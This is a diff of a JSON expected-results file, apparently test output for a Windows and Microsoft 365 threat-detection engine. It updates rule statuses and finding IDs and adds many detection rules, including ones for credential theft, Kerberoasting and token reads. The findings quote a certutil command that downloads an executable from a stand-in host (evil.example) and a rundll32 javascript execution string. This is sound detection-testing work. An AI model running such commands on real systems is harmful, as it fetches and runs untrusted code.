@@ -53,41 +53,40 @@
   "mail-yara-match": "no_selector_match",
   "win-accessibility-binary-shell": "no_selector_match",
   "win-account-lockouts": "not_applicable",
-  "win-admin-share-access": "not_applicable",
   "win-anonymous-logon": "no_selector_match",
   "win-applocker-codeintegrity-block": "not_applicable",
-  "win-asrep-roasting": "not_applicable",
+  "win-asrep-roasting": "no_selector_match",
   "win-audit-policy-changed": "not_applicable",
   "win-autoelevate-binary-unusual-parent": "no_selector_match",
   "win-bits-download": "no_selector_match",
   "win-bits-job-notify-command": "no_selector_match",
   "win-boot-kernel-debug-enabled": "not_applicable",
   "win-boot-test-signing-enabled": "not_applicable",
-  "win-browser-credential-store-read": "not_applicable",
+  "win-browser-credential-store-read": "no_selector_match",
   "win-browser-password-reauth": "no_selector_match",
   "win-browser-spawns-shell": "no_selector_match",
-  "win-com-server-suspicious-path": "not_applicable",
+  "win-com-server-suspicious-path": "no_selector_match",
   "win-credential-app-memory-read": "not_applicable",
   "win-credential-dumping": "no_selector_match",
   "win-dcom-lateral-denied": "not_applicable",
   "win-defender-detection": "not_applicable",
   "win-defender-disabled": "not_applicable",
-  "win-directinput-from-user-folder": "not_applicable",
+  "win-directinput-from-user-folder": "no_selector_match",
   "win-event-log-cleared": "not_applicable",
   "win-event-log-service-stopped": "not_applicable",
   "win-eventlog-crash-after-remote-pipe": "no_selector_match",
   "win-eventlog-service-crash": "no_selector_match",
-  "win-executable-written-to-drive-share": "not_applicable",
+  "win-executable-written-to-drive-share": "no_selector_match",
   "win-explicit-credentials-4648": "not_applicable",
   "win-explicit-credentials-unusual-process": "not_applicable",
   "win-hacktool-privilege-enabled": "not_applicable",
-  "win-ieak-pending-gpo-persistence": "not_applicable",
-  "win-ipc-rpc-user-session-recon": "not_applicable",
+  "win-ieak-pending-gpo-persistence": "no_selector_match",
+  "win-ipc-rpc-user-session-recon": "no_selector_match",
   "win-kekeo-named-pipe": "not_applicable",
-  "win-kerberoasting": "not_applicable",
-  "win-kerberos-password-spray": "not_applicable",
+  "win-kerberoasting": "no_selector_match",
+  "win-kerberos-password-spray": "no_selector_match",
   "win-kerberos-preauth-bruteforce": "not_applicable",
-  "win-kerberos-user-enumeration": "not_applicable",
+  "win-kerberos-user-enumeration": "no_selector_match",
   "win-logon-weekend": "outside_time_window",
   "win-lsa-package-unsigned": "not_applicable",
   "win-lsass-memory-access": "not_applicable",
@@ -98,20 +97,19 @@
   "win-msiexec-quiet-install": "no_selector_match",
   "win-mssql-login-spray": "not_applicable",
   "win-mssql-xpcmdshell-blocked": "not_applicable",
-  "win-network-share-created": "not_applicable",
+  "win-network-share-created": "no_selector_match",
   "win-new-firewall-rule": "not_applicable",
   "win-ntlm-bruteforce-4776": "not_applicable",
-  "win-null-session-pipes-changed": "not_applicable",
+  "win-null-session-pipes-changed": "no_selector_match",
   "win-pass-the-hash-hint": "no_selector_match",
   "win-password-reset-by-other": "not_applicable",
   "win-password-spraying": "below_threshold",
   "win-pca-cpl-user-path": "not_applicable",
-  "win-powershell-clm-lockdown-removed": "not_applicable",
-  "win-powershell-execution-policy-relaxed": "not_applicable",
+  "win-powershell-clm-lockdown-removed": "no_selector_match",
+  "win-powershell-execution-policy-relaxed": "no_selector_match",
   "win-ppid-spoofing-handle": "not_applicable",
   "win-privileged-local-group-enumeration": "not_applicable",
   "win-process-access-hollowing": "not_applicable",
-  "win-process-from-suspicious-path": "no_selector_match",
   "win-process-image-tampering": "no_selector_match",
   "win-process-sweep-unbacked-code": "not_applicable",
   "win-ps800-download-cradle": "no_selector_match",
@@ -120,34 +118,34 @@
   "win-rdp-activex-unusual-host": "no_selector_match",
   "win-rdp-bluekeep-ms-t120": "not_applicable",
   "win-rdp-bruteforce-rdpcorets": "not_applicable",
-  "win-rdp-connect-then-run-dialog": "no_selector_match",
-  "win-rdp-enabled-registry": "not_applicable",
+  "win-rdp-connect-then-run-dialog": "below_threshold",
+  "win-rdp-enabled-registry": "no_selector_match",
   "win-rdp-headless-client": "not_applicable",
   "win-rdp-loopback-tunnel": "not_applicable",
-  "win-registry-hive-written-to-share": "not_applicable",
-  "win-registry-run-key": "not_applicable",
-  "win-registry-run-key-program": "not_applicable",
-  "win-registry-symbolic-link-created": "not_applicable",
-  "win-remote-eventlog-pipe": "not_applicable",
+  "win-registry-hive-written-to-share": "no_selector_match",
+  "win-registry-run-key": "no_selector_match",
+  "win-registry-run-key-program": "no_selector_match",
+  "win-registry-symbolic-link-created": "no_selector_match",
+  "win-remote-eventlog-pipe": "no_selector_match",
   "win-remote-named-pipe-enumeration": "not_applicable",
   "win-remote-thread-injection": "not_applicable",
   "win-remote-thread-windows-routine": "not_applicable",
   "win-renamed-windows-lolbin": "no_selector_match",
   "win-rpc-efsr-coercion": "not_applicable",
   "win-rpc-zerologon-passwordset": "not_applicable",
-  "win-sam-builtin-admin-password-set": "not_applicable",
-  "win-sam-local-account-created": "not_applicable",
-  "win-sam-privileged-group-changed": "not_applicable",
-  "win-sam-written-outside-lsass": "not_applicable",
+  "win-sam-builtin-admin-password-set": "no_selector_match",
+  "win-sam-local-account-created": "no_selector_match",
+  "win-sam-privileged-group-changed": "no_selector_match",
+  "win-sam-written-outside-lsass": "no_selector_match",
   "win-scheduled-task-created": "not_applicable",
   "win-scheduled-task-suspicious-content": "not_applicable",
   "win-script-engine-selected-by-clsid": "no_selector_match",
   "win-script-host-remote-task-rpc": "no_selector_match",
   "win-sensitive-privilege-enabled": "not_applicable",
-  "win-service-account-loopback-pipe": "not_applicable",
+  "win-service-account-loopback-pipe": "no_selector_match",
   "win-service-account-spawns-system": "no_selector_match",
   "win-service-host-interactive-shell": "no_selector_match",
-  "win-service-registry-suspicious": "not_applicable",
+  "win-service-registry-suspicious": "no_selector_match",
   "win-shadow-copy-deletion": "no_selector_match",
   "win-share-on-system-folder": "not_applicable",
   "win-shim-accessibility-binary": "not_applicable",
@@ -157,20 +155,20 @@
   "win-spooler-driver-dll": "no_selector_match",
   "win-spoolsv-unexpected-child": "no_selector_match",
   "win-suspicious-dns-sysmon": "no_selector_match",
-  "win-system-process-unsigned-dll": "not_applicable",
-  "win-system-process-unsigned-system-dll": "not_applicable",
+  "win-system-process-unsigned-dll": "no_selector_match",
+  "win-system-process-unsigned-system-dll": "no_selector_match",
   "win-time-changed": "no_selector_match",
   "win-timestomp-whole-second": "not_applicable",
   "win-tsclient-execution": "no_selector_match",
   "win-txf-transaction-user-path": "not_applicable",
   "win-uac-bypass-token-duplication": "no_selector_match",
-  "win-uac-bypass-user-open-command": "not_applicable",
+  "win-uac-bypass-user-open-command": "no_selector_match",
   "win-unexpected-inbound-listener": "no_selector_match",
   "win-unsigned-driver-loaded": "not_applicable",
-  "win-update-orchestrator-rogue-command": "not_applicable",
+  "win-update-orchestrator-rogue-command": "no_selector_match",
   "win-usb-mass-storage": "no_selector_match",
   "win-user-added-security-group": "no_selector_match",
-  "win-user-systemroot-redirected": "not_applicable",
+  "win-user-systemroot-redirected": "no_selector_match",
   "win-username-enumeration": "no_selector_match",
   "win-web-worker-admin-logon": "no_selector_match",
   "win-winrm-remote-shell": "no_selector_match",
@@ -181,25 +179,25 @@
  "errors": [],
  "findings": {
   "collection-encoded-execution": [
-   "collection-encoded-execution|161"
+   "collection-encoded-execution|238"
   ],
   "collection-persistence-user-path": [
-   "collection-persistence-user-path|160"
+   "collection-persistence-user-path|237"
   ],
   "collection-prefetch-script-execution": [
-   "collection-prefetch-script-execution|164"
+   "collection-prefetch-script-execution|241"
   ],
   "collection-remote-service": [
-   "collection-remote-service|160"
+   "collection-remote-service|237"
   ],
   "collection-script-host-connection": [
-   "collection-script-host-connection|162"
+   "collection-script-host-connection|239"
   ],
   "collection-service-unquoted-path": [
-   "collection-service-unquoted-path|165"
+   "collection-service-unquoted-path|242"
   ],
   "m365-app-consent": [
-   "m365-app-consent|158"
+   "m365-app-consent|235"
   ],
   "m365-inbox-rule-any": [
    "m365-inbox-rule-any|80"
@@ -211,16 +209,16 @@
    "m365-inbox-rule-hiding|80"
   ],
   "m365-mailbox-forwarding": [
-   "m365-mailbox-forwarding|156"
+   "m365-mailbox-forwarding|233"
   ],
   "m365-mailitemsaccessed-burst": [
    "m365-mailitemsaccessed-burst|alice@contoso.com\u0001185.220.101.44|29804245"
   ],
   "m365-privileged-role-assigned": [
-   "m365-privileged-role-assigned|159"
+   "m365-privileged-role-assigned|236"
   ],
   "m365-role-assigned-any": [
-   "m365-role-assigned-any|159"
+   "m365-role-assigned-any|236"
   ],
   "m365-signin-bruteforce-account": [
    "m365-signin-bruteforce-account|alice@contoso.com|29804234"
@@ -232,13 +230,13 @@
    "m365-signin-password-spray|185.220.101.44|29804230"
   ],
   "m365-signin-risky": [
-   "m365-signin-risky|157"
+   "m365-signin-risky|234"
   ],
   "m365-signin-two-countries-24h": [
    "m365-signin-two-countries-24h|alice@contoso.com|29804070"
   ],
   "m365-signin-unexpected-country": [
-   "m365-signin-unexpected-country|157",
+   "m365-signin-unexpected-country|234",
    "m365-signin-unexpected-country|46"
   ],
   "mail-attachment-disguised": [
@@ -323,6 +321,9 @@
   "win-ad-acl-changed-domain-root-or-adminsdholder": [
    "win-ad-acl-changed-domain-root-or-adminsdholder|dc01\u0001dc=corp,dc=local"
   ],
+  "win-ad-credential-roaming-attribute": [
+   "win-ad-credential-roaming-attribute|164"
+  ],
   "win-ad-extended-right-modified": [
    "win-ad-extended-right-modified|dc01\u0001cn=user-force-change-password,cn=extended-rights,cn=configuration,dc=corp,dc=local"
   ],
@@ -344,6 +345,9 @@
   "win-adcs-template-changed": [
    "win-adcs-template-changed|pki01\u0001alice"
   ],
+  "win-admin-share-access": [
+   "win-admin-share-access|10.0.0.66\u0001admin\u0001ws01"
+  ],
   "win-audit-log-cleared": [
    "win-audit-log-cleared|91"
   ],
@@ -353,11 +357,38 @@
   "win-bitlocker-password-protector-added": [
    "win-bitlocker-password-protector-added|ws01\u0001c:"
   ],
+  "win-browser-extension-policy": [
+   "win-browser-extension-policy|165"
+  ],
+  "win-browser-update-disabled": [
+   "win-browser-update-disabled|166"
+  ],
   "win-bruteforce-4625-by-account": [
    "win-bruteforce-4625-by-account|alice|29804250"
   ],
   "win-bruteforce-4625-by-ip": [
    "win-bruteforce-4625-by-ip|203.0.113.9|29804250"
+  ],
+  "win-builtin-account-renamed": [
+   "win-builtin-account-renamed|167"
+  ],
+  "win-cloud-drive-cli-token": [
+   "win-cloud-drive-cli-token|168"
+  ],
+  "win-cloud-token-files-read": [
+   "win-cloud-token-files-read|169"
+  ],
+  "win-cmd-envvar-substring-obfuscation": [
+   "win-cmd-envvar-substring-obfuscation|170"
+  ],
+  "win-cmd-quote-insertion": [
+   "win-cmd-quote-insertion|171"
+  ],
+  "win-cmdlet-named-exe-in-windowsapps": [
+   "win-cmdlet-named-exe-in-windowsapps|172"
+  ],
+  "win-defender-control-tool": [
+   "win-defender-control-tool|173"
   ],
   "win-dns-server-logging-changed": [
    "win-dns-server-logging-changed|dc01\u0001eventloglevel"
@@ -371,11 +402,38 @@
   "win-domain-policy-changed-by-user": [
    "win-domain-policy-changed-by-user|dc01\u0001alice"
   ],
+  "win-dotnet-compiler-dns": [
+   "win-dotnet-compiler-dns|156"
+  ],
+  "win-efi-boot-file-written": [
+   "win-efi-boot-file-written|157"
+  ],
+  "win-file-association-hijack": [
+   "win-file-association-hijack|174"
+  ],
+  "win-fsutil-symlink-evaluation": [
+   "win-fsutil-symlink-evaluation|175"
+  ],
+  "win-gpo-disabled-or-unlinked": [
+   "win-gpo-disabled-or-unlinked|158"
+  ],
   "win-guest-account-enabled": [
    "win-guest-account-enabled|ws01\u0001s-1-5-21-1-2-3-501"
   ],
+  "win-impacket-admin-share-output": [
+   "win-impacket-admin-share-output|176"
+  ],
   "win-kdc-certificate-weak-mapping": [
    "win-kdc-certificate-weak-mapping|dc01\u0001administrator"
+  ],
+  "win-kerberos-computer-service-ticket-sweep": [
+   "win-kerberos-computer-service-ticket-sweep|10.0.0.77|29804257"
+  ],
+  "win-kerberos-rc4-tgt": [
+   "win-kerberos-rc4-tgt|177"
+  ],
+  "win-kerberos-rc4-ticket-for-computer": [
+   "win-kerberos-rc4-ticket-for-computer|178"
   ],
   "win-logon-outside-business-hours": [
    "win-logon-outside-business-hours|2"
@@ -383,6 +441,18 @@
   "win-lolbin-suspicious-commandline": [
    "win-lolbin-suspicious-commandline|ws01\u0001\u0001c:\\windows\\system32\\rundll32.exe\u0001rundll32.exe javascript:\"\\..\\mshtml,runhtmlapplication\"",
    "win-lolbin-suspicious-commandline|ws01\u0001c:\\windows\\system32\\certutil.exe\u0001\u0001certutil.exe -urlcache -split -f http://evil.example/a.exe c:\\users\\public\\a.exe"
+  ],
+  "win-lsa-protection-disabled": [
+   "win-lsa-protection-disabled|159"
+  ],
+  "win-mail-store-outside-mail-folder": [
+   "win-mail-store-outside-mail-folder|179"
+  ],
+  "win-mock-trusted-directory": [
+   "win-mock-trusted-directory|160"
+  ],
+  "win-msdtc-unusual-parent": [
+   "win-msdtc-unusual-parent|180"
   ],
   "win-mssql-audit-tampered": [
    "win-mssql-audit-tampered|sql01\u0001dba1\u0001server-audit-spec"
@@ -411,8 +481,23 @@
   "win-mssql-single-user-mode": [
    "win-mssql-single-user-mode|sql01\u0001mssql$prod"
   ],
+  "win-netsupport-outside-program-files": [
+   "win-netsupport-outside-program-files|181"
+  ],
+  "win-network-scanner-tools": [
+   "win-network-scanner-tools|182"
+  ],
+  "win-nirsoft-password-tools": [
+   "win-nirsoft-password-tools|183"
+  ],
+  "win-ntds-snapshot-mounted": [
+   "win-ntds-snapshot-mounted|184"
+  ],
   "win-office-spawns-shell": [
    "win-office-spawns-shell|84"
+  ],
+  "win-packet-capture-tool": [
+   "win-packet-capture-tool|185"
   ],
   "win-password-never-expires-set": [
    "win-password-never-expires-set|dc01\u0001roastme"
@@ -421,7 +506,17 @@
    "win-powershell-encoded-command|84"
   ],
   "win-powershell-suspicious-scriptblock": [
-   "win-powershell-suspicious-scriptblock|109"
+   "win-powershell-suspicious-scriptblock|109",
+   "win-powershell-suspicious-scriptblock|187"
+  ],
+  "win-powerup-privesc-checks": [
+   "win-powerup-privesc-checks|186"
+  ],
+  "win-process-from-suspicious-path": [
+   "win-process-from-suspicious-path|182"
+  ],
+  "win-ps-adsisearcher-recon": [
+   "win-ps-adsisearcher-recon|161"
   ],
   "win-ps-amsi-bypass-run": [
    "win-ps-amsi-bypass-run|ws01\u0001alice"
@@ -429,8 +524,14 @@
   "win-ps-bits-transfer": [
    "win-ps-bits-transfer|ws01\u0001alice"
   ],
+  "win-ps-delegation-discovery": [
+   "win-ps-delegation-discovery|162"
+  ],
   "win-ps-forest-or-trust-discovery": [
    "win-ps-forest-or-trust-discovery|ws01\u0001alice"
+  ],
+  "win-ps-kerberoast-tool": [
+   "win-ps-kerberoast-tool|187"
   ],
   "win-ps-kerberos-ticket-requested-for-spn": [
    "win-ps-kerberos-ticket-requested-for-spn|ws01\u0001alice"
@@ -456,8 +557,20 @@
   "win-ps-spn-accounts-searched": [
    "win-ps-spn-accounts-searched|ws01\u0001alice"
   ],
+  "win-ps-winrm-trustedhosts": [
+   "win-ps-winrm-trustedhosts|188"
+  ],
   "win-ps-wmi-permanent-subscription": [
    "win-ps-wmi-permanent-subscription|ws01\u0001alice"
+  ],
+  "win-python-startup-hook": [
+   "win-python-startup-hook|163"
+  ],
+  "win-pythonpath-env-set": [
+   "win-pythonpath-env-set|189"
+  ],
+  "win-rdp-inbound-burst": [
+   "win-rdp-inbound-burst|ws01\u0001203.0.113.50|29804257"
   ],
   "win-rdp-logon-any": [
    "win-rdp-logon-any|2",
@@ -466,6 +579,12 @@
   "win-rdp-logon-external": [
    "win-rdp-logon-external|2",
    "win-rdp-logon-external|81"
+  ],
+  "win-remote-computer-management": [
+   "win-remote-computer-management|190"
+  ],
+  "win-rras-router-manager-dll": [
+   "win-rras-router-manager-dll|191"
   ],
   "win-sensitive-user-right-assigned": [
    "win-sensitive-user-right-assigned|dc01\u0001s-1-5-21-1-2-3-1201"
@@ -490,6 +609,9 @@
   ],
   "win-user-added-privileged-group": [
    "win-user-added-privileged-group|95"
+  ],
+  "win-winscp-or-putty-secrets-read": [
+   "win-winscp-or-putty-secrets-read|192"
   ]
  },
  "rules": [
@@ -587,6 +709,7 @@
   "win-account-security-weakened",
   "win-ad-acl-changed",
   "win-ad-acl-changed-domain-root-or-adminsdholder",
+  "win-ad-credential-roaming-attribute",
   "win-ad-extended-right-modified",
   "win-ad-server-object-created",
   "win-adcs-audit-filter-changed",
@@ -608,14 +731,23 @@
   "win-boot-kernel-debug-enabled",
   "win-boot-test-signing-enabled",
   "win-browser-credential-store-read",
+  "win-browser-extension-policy",
   "win-browser-password-reauth",
   "win-browser-spawns-shell",
+  "win-browser-update-disabled",
   "win-bruteforce-4625-by-account",
   "win-bruteforce-4625-by-ip",
+  "win-builtin-account-renamed",
+  "win-cloud-drive-cli-token",
+  "win-cloud-token-files-read",
+  "win-cmd-envvar-substring-obfuscation",
+  "win-cmd-quote-insertion",
+  "win-cmdlet-named-exe-in-windowsapps",
   "win-com-server-suspicious-path",
   "win-credential-app-memory-read",
   "win-credential-dumping",
   "win-dcom-lateral-denied",
+  "win-defender-control-tool",
   "win-defender-detection",
   "win-defender-disabled",
   "win-directinput-from-user-folder",
@@ -623,6 +755,8 @@
   "win-dns-server-plugin-dll-set",
   "win-dns-wildcard-or-wpad-record",
   "win-domain-policy-changed-by-user",
+  "win-dotnet-compiler-dns",
+  "win-efi-boot-file-written",
   "win-event-log-cleared",
   "win-event-log-service-stopped",
   "win-eventlog-crash-after-remote-pipe",
@@ -630,25 +764,36 @@
   "win-executable-written-to-drive-share",
   "win-explicit-credentials-4648",
   "win-explicit-credentials-unusual-process",
+  "win-file-association-hijack",
+  "win-fsutil-symlink-evaluation",
+  "win-gpo-disabled-or-unlinked",
   "win-guest-account-enabled",
   "win-hacktool-privilege-enabled",
   "win-ieak-pending-gpo-persistence",
+  "win-impacket-admin-share-output",
   "win-ipc-rpc-user-session-recon",
   "win-kdc-certificate-weak-mapping",
   "win-kekeo-named-pipe",
   "win-kerberoasting",
+  "win-kerberos-computer-service-ticket-sweep",
   "win-kerberos-password-spray",
   "win-kerberos-preauth-bruteforce",
+  "win-kerberos-rc4-tgt",
+  "win-kerberos-rc4-ticket-for-computer",
   "win-kerberos-user-enumeration",
   "win-logon-outside-business-hours",
   "win-logon-weekend",
   "win-lolbin-suspicious-commandline",
   "win-lsa-package-unsigned",
+  "win-lsa-protection-disabled",
   "win-lsass-memory-access",
   "win-lsass-memory-access-signed",
   "win-lsass-silentprocessexit-dump",
   "win-machine-account-password-reset",
+  "win-mail-store-outside-mail-folder",
+  "win-mock-trusted-directory",
   "win-msbuild-exec-task-script-host",
+  "win-msdtc-unusual-parent",
   "win-msiexec-quiet-install",
   "win-mssql-audit-tampered",
   "win-mssql-dangerous-option-enabled",
@@ -661,11 +806,16 @@
   "win-mssql-server-role-member-added",
   "win-mssql-single-user-mode",
   "win-mssql-xpcmdshell-blocked",
+  "win-netsupport-outside-program-files",
+  "win-network-scanner-tools",
   "win-network-share-created",
   "win-new-firewall-rule",
+  "win-nirsoft-password-tools",
+  "win-ntds-snapshot-mounted",
   "win-ntlm-bruteforce-4776",
   "win-null-session-pipes-changed",
   "win-office-spawns-shell",
+  "win-packet-capture-tool",
   "win-pass-the-hash-hint",
   "win-password-never-expires-set",
   "win-password-reset-by-other",
@@ -675,15 +825,19 @@
   "win-powershell-encoded-command",
   "win-powershell-execution-policy-relaxed",
   "win-powershell-suspicious-scriptblock",
+  "win-powerup-privesc-checks",
   "win-ppid-spoofing-handle",
   "win-privileged-local-group-enumeration",
   "win-process-access-hollowing",
   "win-process-from-suspicious-path",
   "win-process-image-tampering",
   "win-process-sweep-unbacked-code",
+  "win-ps-adsisearcher-recon",
   "win-ps-amsi-bypass-run",
   "win-ps-bits-transfer",
+  "win-ps-delegation-discovery",
   "win-ps-forest-or-trust-discovery",
+  "win-ps-kerberoast-tool",
   "win-ps-kerberos-ticket-requested-for-spn",
   "win-ps-named-pipe-shell",
   "win-ps-openssh-server-enabled",
@@ -692,16 +846,20 @@
   "win-ps-service-created",
   "win-ps-service-registry-path-changed",
   "win-ps-spn-accounts-searched",
+  "win-ps-winrm-trustedhosts",
   "win-ps-wmi-permanent-subscription",
   "win-ps800-download-cradle",
   "win-psexec-pattern",
   "win-psexec-renamed-service-pipe",
+  "win-python-startup-hook",
+  "win-pythonpath-env-set",
   "win-rdp-activex-unusual-host",
   "win-rdp-bluekeep-ms-t120",
   "win-rdp-bruteforce-rdpcorets",
   "win-rdp-connect-then-run-dialog",
   "win-rdp-enabled-registry",
   "win-rdp-headless-client",
+  "win-rdp-inbound-burst",
   "win-rdp-logon-any",
   "win-rdp-logon-external",
   "win-rdp-loopback-tunnel",
@@ -709,6 +867,7 @@
   "win-registry-run-key",
   "win-registry-run-key-program",
   "win-registry-symbolic-link-created",
+  "win-remote-computer-management",
   "win-remote-eventlog-pipe",
   "win-remote-named-pipe-enumeration",
   "win-remote-thread-injection",
@@ -716,6 +875,7 @@
   "win-renamed-windows-lolbin",
   "win-rpc-efsr-coercion",
   "win-rpc-zerologon-passwordset",
+  "win-rras-router-manager-dll",
   "win-sam-builtin-admin-password-set",
   "win-sam-local-account-created",
   "win-sam-privileged-group-changed",
@@ -763,6 +923,7 @@
   "win-username-enumeration",
   "win-web-worker-admin-logon",
   "win-winrm-remote-shell",
+  "win-winscp-or-putty-secrets-read",
   "win-winsock-lsp-installed",
   "win-wmi-persistence",
   "win-zerologon-anonymous-account-change"
